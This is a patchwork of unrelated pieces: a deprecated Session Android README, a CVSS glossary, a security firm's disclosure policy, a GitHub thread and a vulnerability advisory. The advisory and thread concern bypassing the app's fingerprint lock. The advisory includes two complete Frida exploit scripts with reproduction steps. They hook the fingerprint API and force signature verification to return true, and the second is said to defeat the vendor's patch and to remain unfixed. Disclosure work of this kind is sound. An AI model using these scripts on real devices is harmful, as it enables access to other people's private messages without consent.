# Repository Deprecated

## This repository is now deprecated. However, Session Android is still actively developed [here](https://github.com/session-foundation/session-android). This is in line with announcements from [Session](https://getsession.org/blog/introducing-the-session-technology-foundation) and the [OPTF](https://optf.ngo/blog/the-optf-and-session), indicating that the OPTF has handed over the stewardship of the Session Project to the [Session Technology Foundation](https://session.foundation), a Swiss-based foundation dedicated to advancing digital rights and innovation.

# Session Android

[Download on the Google Play Store](https://getsession.org/android)

Add the [F-Droid repo](https://fdroid.getsession.org/)

[Download the APK from here](https://github.com/oxen-io/session-android/releases/latest)

## Summary

Session integrates directly with [Oxen Service Nodes](https://docs.oxen.io/about-the-oxen-blockchain/oxen-service-nodes), which are a set of distributed, decentralized and Sybil resistant nodes. Service Nodes act as servers which store messages offline, and a set of nodes which allow for onion routing functionality obfuscating users' IP addresses. For a full understanding of how Session works, read the [Session Whitepaper](https://getsession.org/whitepaper).

## Want to contribute? Found a bug or have a feature request?

Please search for any [existing issues](https://github.com/oxen-io/session-android/issues) that describe your bugs in order to avoid duplicate submissions. Submissions can be made by making a pull request to our `dev` branch. If you don't know where to start contributing, try reading the Github issues page for ideas.

## Build instructions

Build instructions can be found in [BUILDING.md](/oxen-io/session-android/blob/master/BUILDING.md).

## Verifying signatures

**Step 1:**

```
wget https://raw.githubusercontent.com/oxen-io/oxen-core/master/utils/gpg_keys/KeeJef.asc
gpg --import KeeJef.asc

```

**Step 2:**

Get the signed hash for this release. `SESSION_VERSION` needs to be updated for the release you want to verify.

```
export SESSION_VERSION=1.10.4
wget https://github.com/oxen-io/session-android/releases/download/$SESSION_VERSION/signatures.asc

```

**Step 3:**

Verify the signature of the hashes of the files.

```
gpg --verify signatures.asc 2>&1 |grep "Good signature from"

```

The command above should print "`Good signature from "Kee Jefferys...`". If it does, the hashes are valid but we still have to make the sure the signed hashes matches the downloaded files.

**Step 4:**

Make sure the two commands below returns the same hash. If they do, files are valid.

```
sha256sum session-$SESSION_VERSION-universal.apk
grep universal.apk signatures.asc

```

## Description

Session 1.13.0 allows an attacker with physical access to the victim's device to bypass the application's password/pin lock to access user data. This is possible due to lack of adequate security controls to prevent dynamic code manipulation.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

# Disclosure Policy

#### *This document was last updated on January 12, 2024*

This disclosure policy ("Policy") describes how Fluid Attacks ("Fluid
Attacks", "we", "us" or "our") discloses third-party product
vulnerabilities found by our Offensive Team.

This Policy does not apply to vulnerabilities found for customers
as part of the [Continuous Hacking](../../services/continuous-hacking/) service,
unless there is explicit approval,
as they are covered by a Non-Disclosure Agreement.

## Goal

Fluid Attacks' commitment is to find all vulnerabilities and report
them as soon as possible. In order to accomplish this, we adhere to the
[ISO/IEC 29147:2018](https://www.iso.org/standard/72311.html) and
[ISO/IEC 30111:2019](https://www.iso.org/standard/69725.html) standards,
which describes the accepted responsible disclosure and vulnerability
handling guidelines to ensure the maximum benefit for vendors, customers
and the community in general. This includes:

* Providing the maximum level of detail on the vulnerabilities found
  in a way that the vendors are able to reproduce the problem.
* Ensuring coordinated disclosure of the vulnerabilities with the
  affected vendors, minimizing the damage that can occur with early
  disclosures.
* Releasing the details of the vulnerabilities on our
  [Advisories](../) page, including a risk level score using [CVSS
  v3.1](https://www.first.org/cvss/calculator/3.1) and proof of
  concept artifacts.

This leads to an overall risk reduction for the users.

## Scope

Fluid Attacks will apply this Policy to disclose third-party product
vulnerabilities to whom we will issue CVE IDs and that are not in the
scope of another CNA (CVE Numbering Authority).

The vulnerability types that we would process are the ones defined in
our [findings classification](https://docs.fluidattacks.com/criteria/vulnerabilities/).
However, vulnerabilities that don't fit on this classification will be
also reviewed if there is an evidenced risk.

## Advisories

To follow the accepted practices of emitting CVE IDs, we have the
following considerations when creating the advisories:

* The advisory will include all the relevant information for the
  vendor to understand the technical weakness.
* We will emit a CVE ID per request, regardless the number of
  fields affected, which leads to the same sink.
* The advisory may contain proof-of-concept code which is
  delivered without any guarantees or liabilities. We are not
  responsible for any damaged caused by executing such code.

## Disclosure process

Fluid Attacks is always looking for vulnerabilities.
Once our team finds a new unpublished vulnerability,
we will proceed as follows:

1. An initial report is created with all the details of the
   vulnerability and with any applicable proof of concept.
2. If the vulnerability is found through our [Continuous
   Hacking service](../../services/continuous-hacking/),
   it will be reported only to the affected
   customer via our platform.
   Moreover,
   if this vulnerability affects a third-party product,
   we will proceed to ask for the customer's consent
   to send the report to the product vendor.
3. If the vulnerability is found by our Research Team in a third-party
   product, the report will be sent to the affected vendor.
4. A new advisory draft is created on our [Advisories](../) page
   containing only the affected product, the report's current status
   and the timeline. We will update it at each relevant event around
   the vulnerability (vendor reply, patch availability, proof of
   concept availability, in-the-wild exploitation indicators, etc.).
5. We will wait up to five (5) days for the vendor to acknowledge the
   report. If there is no response in that time, we will proceed with
   our [Responsible Disclosure](#Responsible_disclosure) process.
6. If the vendor acknowledges the report but there are no updates on
   the issue after fifteen (15) days, we will proceed with our
   [Responsible Disclosure](#Responsible_disclosure) process.
7. Otherwise, we can arrange a coordinated vulnerability disclosure
   with the vendor. We suggest this to be done in no more than ninety
   (90) days after the discovery.

Fluid Attacks also reserves the right to disclose the vulnerability at
any time in cases where early disclosure would provide benefits to
stakeholders.

## Responsible disclosure

Vulnerability disclosure is performed according to the parameters
described above. The process is as follows:

1. The advisory draft on [Advisories](../) will be updated with the
   details of the vulnerability and any relevant proof of concept.
2. If necessary, a new CVE will be issued.
3. The advisory will be published to relevant public email lists,
   social media or [blog](../../blog/) posts.

| Hello Session team  I will test your solution once implemented to verify that everything works correctly.  However, doing an analysis of the code, it seems to me that you should take into account step 4, which I will show you below:  Link: <https://labs.f-secure.com/blog/how-secure-is-your-android-keystore-authentication>  [image](https://user-images.githubusercontent.com/51862990/171072006-b3fbb174-2eb9-4dd8-90cc-35cfa274023e.png) [image](https://user-images.githubusercontent.com/51862990/171076962-3907d869-1552-451b-ae5e-f4a431aa44bb.png)  I mention this, because it seems that the onAuthenticationSucceeded method still depends on a boolean.  If the cryptographic verification works well, it returns true. However, the correct thing would be that it will retrieve the encryption object from the parameter and USE this encryption object to decrypt some other crucial data, such as the session key **(by "session key" I do not mean the private key of the session app. I simply mean a unique identifier of the user's session)** or a secondary symmetric key that will be used to decrypt the application data.  In this way, an attacker could no longer simply hook into the process so that the function returns true, because now we are dealing with cryptographically sound processes, which if we do not have the corresponding key to decrypt the data, then we will not be able to enter the app.  If you want some guidance with this, I invite you to see the following project, which is an app that implements biometric authentication in a secure way: <https://github.com/FSecureLABS/android-keystore-audit/tree/master/keystorecrypto-app>  Finally, you can check this link where it is explained in even more detail how to solve this problem so that the fingerprint protections cannot be bypassed definitively: <https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05f-testing-local-authentication#biometric-library>  [image](https://user-images.githubusercontent.com/51862990/171075614-d64e41e4-c6dc-4812-9c9c-efc4c0788388.png)  **Remember not to reuse keys and not to leave them exposed in RAM for a long time !!**  Regards, [@Retr02332](https://github.com/Retr02332) |

| [@Retr02332](https://github.com/Retr02332)  I think the issue presented with that approach is that it would require refactoring the application's keystore which provides the ability to decrypt the key information for the user's profile to depend on the biometric-backed key. In the event that a user entrolls a new fingerprint, or turns off biometric security on their device, this key would no longer work and lock the user out of Session, requiring them to restore their account again. Currently the refactored AuthenticationCallback uses a signature and certificate mechanism, which generates a signature from the CryptoObject parameter (unlocked after biometric authentication), then verifies that signing random data with that key matches what is expected, otherwise preventing someone from opening the application. It prevents the original approach to attack the process returning a successful authentication without requiring a major refactor or depending on a key which may be erased external to the application process for crucial data.  Does this make sense to you and sync up with your understanding? |

| Hi [@hjubb](https://github.com/hjubb)  You may perform cryptographic procedures with the cryptobject object. However, the proposed check results in a boolean:  [image](https://user-images.githubusercontent.com/51862990/171190505-525f8df3-7601-48d7-9f05-a3cdfca4bd9e.png)  With this, nothing would prevent an attacker from hooking into the process so that this function always returns true. This is why in this OWASP document we can see the following statement:  Link: <https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05f-testing-local-authentication>  [image](https://user-images.githubusercontent.com/51862990/171187485-7ed22665-dfcd-4dc3-89c2-f00449361a5f.png)  It is necessary to adopt the approach I have mentioned to avoid bypassing biometric authentication, even on rooted devices. This is because if the approach I mentioned to you is adopted, an attacker no matter how much he hooks into the process, would not be able to bypass authentication, since for the user's session to be unlocked a symmetric key must first be recovered with the help of the cryptobject after a successful biometric authentication.  As you see, it is no longer a matter of reimplementing a function in memory so that it returns true forever (the bypass), but we are now facing solid cryptographic process that if we do not have the keys that will help us decrypt the information needed to continue (keys that will be obtained after a successful biometric authentication with the help of the cryptobject), then we will not be able to enter the application.  Finally, you tell me that "it would require refactoring the application keystore that provides the ability to decrypt the user's profile key information to trust the biometric-backed key". This is true, but only if the user has configured biometric fingerprint authentication as the system protection method.  Regards, [@Retr02332](https://github.com/Retr02332) |

| [@hjubb](https://github.com/hjubb) The original problem was solved. That is, now a Cryptobject is used, so the validation of the fingerprint no longer depends on the result of the event handler.  However, please note the recommendations given to improve the patch. |

| Regarding the further recommendations, I am currently trying to understand in which context the signature verification boolean return statement - after using the crypto object which is only unlocked after biometric authentication by the KeyStore - would be an attack surface. I believe the `CryptoObject` returned via the biometric authentication callback will throw a security exception if it is used in a locked state before this check is performed, and I would assume the threat model of an unlocked device (is a rooted device required?) would have different opportunities to circumvent even the requirement of a fingerprint in the first place. Please let me know if I'm on the right track here or if I'm missing something and if you could elaborate on the requirements of the state of the device and OS (root, physically unlocked etc) to perform such a procedure. |

| [@hjubb](https://github.com/hjubb)  I understand. I would like to explain all these points in a practical way. So could you approve this patch that you have made and then I could test the patch in a practical way.  In case I find the bypass in the way I raised you above, then I will send you a mail as I did with this finding.  Regards. |

| Hi [@hjubb](https://github.com/hjubb)  I just sent an email with the following subject line: **"Bypass of the biometric fingerprint authentication patch"**  As I had told you before, once I had the functional exploit I would send you a poc so you could see in detail what I was referring to. In the email are all the complementary details you need.  Regards, [@Retr02332](https://github.com/Retr02332) |

| Hey [@Retr02332](https://github.com/Retr02332) at the moment the further points you have raised aren't practical to implement from an application perspective. It is not really practical to take into consideration an attack relying on full root control of an unlocked device which has been configured with appropriate screen locks or to completely re-architect the application in a way that would rely on such defences which would leave a user's application unusable by turning off or adding additional fingerprints on a device from the settings menu forcing them to re-sync their account. If there are further practical implementations we can look at discussing them and implementing them further but for now I think it is sufficient 👍 |

| Thanks [@Retr02332](https://github.com/Retr02332), it might be helpful in describing the context and state of the devices, I can only see the OS level, not any indication of whether the device was rooted as you had previously mentioned. |

## Description

An attacker with physical access to the victim's device can
bypass the application's fingerprint lock to access user data.
This is possible due to lack of adequate security controls to
prevent dynamic code manipulation.

In android application fingerprint implementations, the
**onAuthenticationSucceeded** method is triggered when the
system successfully authenticates a user. Most biometric
authentication implementations rely on this method being
called, without worrying about the CryptoObject. The
application logic responsible for unlocking the application
is usually included in this callback method. This approach
is trivially exploited by connecting to the application
process and calling the **AuthenticationSucceeded** method
directly, as a result, the application can be unlocked
without providing valid biometric data. (In short,
fingerprint validation depends on an event and not on
an actual security validation.)

Another common case, occurs when some developers use
CryptoObject but do not encrypt/decrypt data that is
crucial for the application to function properly.
Therefore, we could skip the authentication step
altogether and proceed to use the application.

## Proof of Concept

Attached below is a proof-of-concept video showing the
exploitation of the vulnerability:

![POC-Bypass-Fingerprint-Session](https://res.cloudinary.com/fluid-attacks/image/upload/v1656528777/airs/advisories/tempest/poc.gif)

### Steps to reproduce

1. Install and configure frida as indicated in the following [link](https://programmerclick.com/article/51481638343/).
2. Now just run this command to hook into the fingerprint listener,
   so that you can dynamically rewrite its implementation to bypass
   the application's protection.

   ```
   frida -U 'Session' -l exploit.js --no-pause

   ```
3. Now on your device press the 'recent' button, commonly represented
   by a square. This button opens the recent apps view so that you can
   switch from one open app to another.
4. Log back into Session.
5. As you had left the exploit running with frida, you will notice that
   in less than a second you will enter the application, without even
   having set a valid fingerprint.

## Exploit

```
// exploit.js
const getAuthResult = (AuthenticationResult, crypto) => AuthenticationResult.$new(
 crypto, null, 0
);

const exploit = () => {
 console.log("[+] Hooking PassphrasePromptActivity - Method resumeScreenLock");
 const AuthenticationResult = Java.use(
 'android.hardware.fingerprint.FingerprintManager$AuthenticationResult'
 );
 const FingerprintManager = Java.use(
 'android.hardware.fingerprint.FingerprintManager'
 );
 const CryptoObject = Java.use(
 'android.hardware.fingerprint.FingerprintManager$CryptoObject'
 );

 console.log("Hooking FingerprintManagerCompat.authenticate()...");
 const fingerprintManager_authenticate = FingerprintManager['authenticate'].overload(
 'android.hardware.fingerprint.FingerprintManager$CryptoObject',
 'android.os.CancellationSignal',
 'int',
 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback',
 'android.os.Handler'
 );

 fingerprintManager_authenticate.implementation = (
 crypto, cancel, flags, callback, handler) => {
 console.log("Bypass Lock Screen - Fingerprint");

 // We send a null cryptoObject to the listener of the fingerprint
 var crypto = CryptoObject.$new(null);
 var authenticationResult = getAuthResult(AuthenticationResult, crypto);
 callback.onAuthenticationSucceeded(authenticationResult);
 return this.authenticate(crypto, cancel, flags, callback, handler);
 }
}

Java.perform(() => exploit());

```
## Mitigation

### Bypass of the patch implemented at Session 1.13.4

After reporting the security flaw, the Session team implemented a [patch](https://github.com/oxen-io/session-android/commit/db92034a8a85ac33d42235e87f6fce9bc9738475).
However, I managed to bypass the patch using the following exploit:

```
// exploit.js
const getAuthResult = (AuthenticationResult, crypto) => AuthenticationResult.$new(
 crypto, null, 0
);

const exploit = () => {
 console.log("[+] Hooking PassphrasePromptActivity - Method resumeScreenLock");
 const KeyPairGenerator = Java.use(
 'java.security.KeyPairGenerator'
 );
 const Signature = Java.use(
 'java.security.Signature'
 );
 const BiometricSecretProvider = Java.use(
 'org.thoughtcrime.securesms.crypto.BiometricSecretProvider'
 );
 const AuthenticationResult = Java.use(
 'android.hardware.fingerprint.FingerprintManager$AuthenticationResult'
 );
 const FingerprintManager = Java.use(
 'android.hardware.fingerprint.FingerprintManager'
 );
 const CryptoObject = Java.use(
 'android.hardware.fingerprint.FingerprintManager$CryptoObject'
 );

 console.log("Hooking FingerprintManagerCompat.authenticate()...");
 const fingerprintManager_authenticate = FingerprintManager['authenticate'].overload(
 'android.hardware.fingerprint.FingerprintManager$CryptoObject',
 'android.os.CancellationSignal',
 'int',
 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback',
 'android.os.Handler'
 );

 fingerprintManager_authenticate.implementation = (
 crypto, cancel, flags, callback, handler) => {
 console.log("Bypass Lock Screen - Fingerprint");

 // Create Certificate
 var keyGenerator = KeyPairGenerator.getInstance("RSA");
 keyGenerator.initialize(2048);
 var signatureKey = keyGenerator.generateKeyPair();
 var signature = Signature.getInstance("MD5withRSA");
 signature.initSign(signatureKey.getPrivate());
 var crypto = CryptoObject.$new(signature);

 // Create a valid authenticationResult
 var authenticationResult = getAuthResult(AuthenticationResult, crypto);

 // Bypass Validations
 BiometricSecretProvider.verifySignature.implementation = (data, signedData) => {
 return true;
 }

 // Success
 callback.onAuthenticationSucceeded(authenticationResult);
 return this.authenticate(crypto, cancel, flags, callback, handler);
 }
}

Java.perform(() => exploit());

```

The reason the bypass succeeded is because the **onAuthenticationSucceeded**
method still depends on a boolean.

If the cryptographic verification works fine, it returns true. However,
the correct thing to do would be for it to retrieve the encryption object
from the parameter and USE this encryption object to decrypt some other
crucial data, such as the session key (by **"session key"** I don't mean the
session application's private key. I simply mean a unique identifier of
the user's session) or a secondary symmetric key that will be used to
decrypt the application data.

This is why in the description of this finding, we have cited the following:

> some developers use CryptoObject but do not encrypt/decrypt data that
> is crucial for the application to function properly. Therefore, we
> could skip the authentication step altogether and proceed to use
> the application.

Currently, in version 1.13.6 the Session team has not implemented a
second patch to prevent the second exploit.
